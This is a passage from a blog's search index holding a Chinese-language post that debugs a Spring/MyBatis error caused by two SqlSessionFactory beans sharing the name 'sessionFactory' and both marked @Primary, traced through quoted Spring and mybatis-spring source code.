<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Spring中bean name重复的问题]]></title>
      <url>http://qsli.github.io/2020/04/29/spring-bean-duplic-name/</url>
      <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.atour.oss.dao.mapper.OssFileMapper.insert</span><br><span class="line"></span><br><span class="line">	at org.apache.ibatis.binding.MapperMethod<span class="variable">$SqlCommand</span>.&lt;init&gt;(MapperMethod.java:227)</span><br><span class="line">	at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:49)</span><br><span class="line">	at org.apache.ibatis.binding.MapperProxy.cachedMapperMethod(MapperProxy.java:65)</span><br><span class="line">	at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:58)</span><br><span class="line">	at com.sun.proxy.<span class="variable">$Proxy188</span>.insert(Unknown Source)</span><br></pre></td></tr></table></figure>
<p>一个同事新加了一个数据源，然后老的数据源居然报错了，他说没有改动老的。翻了下代码，最后发现是<strong>不加思索地复制粘贴</strong>埋的坑，老的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = MapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.oss.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.oss.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapper所在目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/oss/*.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource 数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新加的代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoticeIntelligenceMapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapper所在目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/noticeIntelligence/*Mapper.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource 数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意看bean的名字，完全一模一样！！！😂，目测spring在查找引用的时候错乱了。值得注意的是，俩bean还都标记上了<code>@Primary</code>。</p>
<h2 id="Primary"><a href="#Primary" class="headerlink" title="@Primary"></a>@Primary</h2><blockquote>
<pre><code>No matter how you designate a primary bean, the effect is the same. You’re telling
</code></pre><p>Spring that it should choose the primary bean in the case of ambiguity.</p>
<pre><code>This works well right up to the point where you designate two or more primary
</code></pre><p>beans.</p>
<pre><code>Now there are two primary Dessert beans: Cake and IceCream. This poses a new ambi
</code></pre><p>guity issue. Just as Spring couldn’t choose among multiple candidate beans, it can’t</p>
<p>choose among multiple primary beans. Clearly, when more than one bean is desig</p>
<p>nated as primary, there are no primary candidates.</p>
<p>​                                                                —— 《Spring in action 4th Edition》</p>
</blockquote>
<p><strong>Clearly, when more than one bean is designated as primary, there are no primary candidates </strong></p>
<p>如果有多个<code>@Primary</code>注解的bean，那么就没有<code>primary</code>的candidate了；这里说的已经很明确了，但是没有说spring具体怎么处理的。毕竟上面的项目启动的时候也没有报<code>ambiguity</code> 相关的异常。</p>
<h2 id="MapperScan"><a href="#MapperScan" class="headerlink" title="MapperScan"></a>MapperScan</h2><p><code>MapperScan</code>是mybatis提供的注解，用来指定扫描dao层接口的目录和mapper文件所在的位置的注解，上面名字冲突的bean是通过下面的形式引入的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br></pre></td></tr></table></figure>
<p>看下源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.annotation.MapperScannerRegistrar#registerBeanDefinitions</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinitions</span><span class="params">(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 省略n行</span></span><br><span class="line">    scanner.setSqlSessionTemplateBeanName(annoAttrs.getString(<span class="string">"sqlSessionTemplateRef"</span>));</span><br><span class="line">    <span class="comment">// 这里获取注解里对应的属性值</span></span><br><span class="line">    scanner.setSqlSessionFactoryBeanName(annoAttrs.getString(<span class="string">"sqlSessionFactoryRef"</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; basePackages = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"value"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"basePackages"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; clazz : annoAttrs.getClassArray(<span class="string">"basePackageClasses"</span>)) &#123;</span><br><span class="line">      basePackages.add(ClassUtils.getPackageName(clazz));</span><br><span class="line">    &#125;</span><br><span class="line">    scanner.registerFilters();</span><br><span class="line">    scanner.doScan(StringUtils.toStringArray(basePackages));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>找到对应属性使用的地方：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.mapper.ClassPathMapperScanner#processBeanDefinitions</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processBeanDefinitions</span><span class="params">(Set&lt;BeanDefinitionHolder&gt; beanDefinitions)</span> </span>&#123;</span><br><span class="line">    GenericBeanDefinition definition;</span><br><span class="line">    <span class="keyword">for</span> (BeanDefinitionHolder holder : beanDefinitions) &#123;</span><br><span class="line">      definition = (GenericBeanDefinition) holder.getBeanDefinition();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">"Creating MapperFactoryBean with name '"</span> + holder.getBeanName() </span><br><span class="line">          + <span class="string">"' and '"</span> + definition.getBeanClassName() + <span class="string">"' mapperInterface"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// the mapper interface is the original class of the bean</span></span><br><span class="line">      <span class="comment">// but, the actual class of the bean is MapperFactoryBean</span></span><br><span class="line">      definition.getConstructorArgumentValues().addGenericArgumentValue(definition.getBeanClassName()); <span class="comment">// issue #59</span></span><br><span class="line">      definition.setBeanClass(<span class="keyword">this</span>.mapperFactoryBean.getClass());</span><br><span class="line"></span><br><span class="line">      definition.getPropertyValues().add(<span class="string">"addToConfig"</span>, <span class="keyword">this</span>.addToConfig);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">boolean</span> explicitFactoryUsed = <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// 这里设置对应依赖的占位</span></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionFactoryBeanName)) &#123;</span><br><span class="line">        <span class="comment">// 这里的RunTimeBean</span></span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionFactoryBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">this</span>.sqlSessionFactory);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionTemplateBeanName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionTemplateBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionTemplate != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">this</span>.sqlSessionTemplate);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!explicitFactoryUsed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">          logger.debug(<span class="string">"Enabling autowire by type for MapperFactoryBean with name '"</span> + holder.getBeanName() + <span class="string">"'."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>最终使用的是<code>RuntimeBeanReference</code>。</p>
<h2 id="RuntimeBeanReference"><a href="#RuntimeBeanReference" class="headerlink" title="RuntimeBeanReference"></a>RuntimeBeanReference</h2><p><code>@Primary</code>注解最终转换成了bean的<code>isPrimary</code>属性，搜代码可以大概知道是在<code>DefaultListableBeanFactory</code>中处理的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.DefaultListableBeanFactory#determinePrimaryCandidate</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine the primary candidate in the given set of beans.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> candidates a Map of candidate names and candidate instances</span></span><br><span class="line"><span class="comment">	 * (or candidate classes if not created yet) that match the required type</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> requiredType the target dependency type to match against</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the name of the primary candidate, or &#123;<span class="doctag">@code</span> null&#125; if none found</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #isPrimary(String, Object)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> String <span class="title">determinePrimaryCandidate</span><span class="params">(Map&lt;String, Object&gt; candidates, Class&lt;?&gt; requiredType)</span> </span>&#123;</span><br><span class="line">		String primaryBeanName = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : candidates.entrySet()) &#123;</span><br><span class="line">			String candidateBeanName = entry.getKey();</span><br><span class="line">			Object beanInstance = entry.getValue();</span><br><span class="line">			<span class="keyword">if</span> (isPrimary(candidateBeanName, beanInstance)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (primaryBeanName != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">boolean</span> candidateLocal = containsBeanDefinition(candidateBeanName);</span><br><span class="line">					<span class="keyword">boolean</span> primaryLocal = containsBeanDefinition(primaryBeanName);</span><br><span class="line">					<span class="keyword">if</span> (candidateLocal &amp;&amp; primaryLocal) &#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> NoUniqueBeanDefinitionException(requiredType, candidates.size(),</span><br><span class="line">								<span class="string">"more than one 'primary' bean found among candidates: "</span> + candidates.keySet());</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (candidateLocal) &#123;</span><br><span class="line">						primaryBeanName = candidateBeanName;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					primaryBeanName = candidateBeanName;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> primaryBeanName;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>但是这里抛异常了，应该不是这里 🙄</p>
<blockquote>
<p>首先是信息解析，即将属性定义中的值进行解析，如RuntimeBeanReference解析成引用的Bean对象，这里会进行级联获取bean信息，并追加depend信息。这一步只是解析。</p>
</blockquote>
<p>原来在这里：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.BeanDefinitionValueResolver#resolveValueIfNecessary</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Given a PropertyValue, return a value, resolving any references to other</span></span><br><span class="line"><span class="comment">	 * beans in the factory if necessary. The value could be:</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A BeanDefinition, which leads to the creation of a corresponding</span></span><br><span class="line"><span class="comment">	 * new bean instance. Singleton flags and names of such "inner beans"</span></span><br><span class="line"><span class="comment">	 * are always ignored: Inner beans are anonymous prototypes.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A RuntimeBeanReference, which must be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A ManagedList. This is a special collection that may contain</span></span><br><span class="line"><span class="comment">	 * RuntimeBeanReferences or Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A ManagedSet. May also contain RuntimeBeanReferences or</span></span><br><span class="line"><span class="comment">	 * Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A ManagedMap. In this case the value may be a RuntimeBeanReference</span></span><br><span class="line"><span class="comment">	 * or Collection that will need to be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;An ordinary object or &#123;<span class="doctag">@code</span> null&#125;, in which case it's left alone.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> argName the name of the argument that the value is defined for</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> value the value object to resolve</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the resolved object</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">resolveValueIfNecessary</span><span class="params">(Object argName, @Nullable Object value)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// We must check each value to see whether it requires a runtime reference</span></span><br><span class="line">		<span class="comment">// to another bean to be resolved.</span></span><br><span class="line">		<span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanReference) &#123;</span><br><span class="line">      <span class="comment">// 在这里处理的！！！</span></span><br><span class="line">			RuntimeBeanReference ref = (RuntimeBeanReference) value;</span><br><span class="line">			<span class="keyword">return</span> resolveReference(argName, ref);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanNameReference) &#123;</span><br><span class="line">			String refName = ((RuntimeBeanNameReference) value).getBeanName();</span><br><span class="line">			refName = String.valueOf(doEvaluate(refName));</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">this</span>.beanFactory.containsBean(refName)) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(</span><br><span class="line">						<span class="string">"Invalid bean name '"</span> + refName + <span class="string">"' in bean reference for "</span> + argName);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> refName;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinitionHolder) &#123;</span><br><span class="line">			<span class="comment">// 